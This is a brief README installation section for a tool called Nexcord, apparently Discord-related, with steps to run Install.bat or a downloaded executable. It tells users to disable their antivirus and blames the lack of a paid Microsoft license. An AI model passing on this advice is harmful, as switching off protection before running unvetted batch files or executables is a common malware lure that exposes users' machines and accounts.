## Installation

#### Source Code Version (More complicated but less buggy)
```It is important to disable your antivirus for it to work. We don’t have a Microsoft license that costs upwards of €300 per year, so your antivirus might flag it as an unsafe file.```
```sh-session
Download Nexcord.zip
Extract File
Tap "Install.bat" in Nexcord folder
Launch nexcord.py and you should be good ;)

NOTE: Make sure you have Python 3.9+ and Added to Path.
```

#### Compiled Version (Easier but more buggy)
```sh-session
Download: https://github.com/DaNexoo/NexCord/releases
Extract File
Download the latest release (Nexcord.zip) and Extract The Executable
Launch Program and Enjoy!
```
